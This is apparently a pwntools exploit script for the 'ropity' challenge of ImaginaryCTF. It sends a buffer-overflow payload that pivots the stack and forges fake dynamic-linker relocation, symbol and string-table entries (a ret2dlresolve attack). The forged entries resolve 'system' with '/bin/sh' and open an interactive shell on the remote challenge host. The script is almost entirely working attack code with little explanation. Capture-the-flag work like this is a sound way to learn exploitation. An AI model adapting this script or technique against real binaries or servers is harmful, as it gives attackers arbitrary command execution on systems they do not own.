from pwn import *

exe = './vuln'

(host,port_num) = ("ropity.chal.imaginaryctf.org",1337)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            [exe] + argv, gdbscript=gscpt, *a, **kw)
    elif args.RE:
        return remote(host,port_num)
    else:
        return process( 
            [exe] + argv, *a, **kw)
    
gscpt = (
    '''
b * main + 31
set follow-fork-mode parent 
'''
).format(**locals())

context.update(arch='amd64')

# SHORTHANDS FOR FNCS
se  = lambda nbytes     : p.send(nbytes)
sl  = lambda nbytes     : p.sendline(nbytes)
sa  = lambda msg,nbytes : p.sendafter(msg,nbytes)
sla = lambda msg,nbytes : p.sendlineafter(msg,nbytes)
rv  = lambda nbytes     : p.recv(nbytes)
rvu = lambda msg        : p.recvuntil(msg)
rvl = lambda            : p.recvline()

# SIMPLE PRETTY PRINTER
def w(*args):
    print(f"〔\033[1;32m>\033[0m〕",end="")
    for i in args:
        print(hex(i)) if(type(i) == int) else print(i,end=" ")
    print("")

# PWNTOOLS CONTEXT
context.log_level = \
    'DEBUG'

# _____________________________________________________ #
# <<<<<<<<<<<<<<< EXPLOIT STARTS HERE >>>>>>>>>>>>>>>>> #

p = start()

loader = 0x401020
cbase = 0x404e20

o_symtab = 0x00000000004003d8
o_strtab = 0x0000000000400450
o_jmprel = 0x0000000000400528

f_symtab = cbase + 0x40
f_strtab = cbase + 0x58
f_jmprel = cbase + 0x28

payload = 0x8*b"a" + p64(cbase) + p64(0x401142)
sl(payload)

w("DIFF JMPREL = ",(f_jmprel - o_jmprel)/0x18)
w("DIFF SYMTAB = ",(f_symtab - o_symtab)/0x18)

payload = (0x8*b"a" + p64(cbase + 0x68) + p64(0x401020) + 
            # CBASE 0x4040a10
            p64((f_jmprel - o_jmprel)//0x18) + p64(0x401142) + p64(0x0) +
            # JMPREL STRUCT 0x404a28
            p64(0x404018) + 
            p32(0x7) + # R_INFO
            p32((f_symtab - o_symtab)//0x18) + # BINDING
            p64(0x0) + 
            # SYMTAB STRUCT 0x404a40
            p64(f_strtab - o_strtab) +
            p32(0x7) + p32(0x12) + 
            p64(0x0) + 
            # FINALLY STRTAB 0x404a58
            b"system\x00\x00" + 
            b"/bin/sh\x00"
            )

sl(payload)

p.interactive()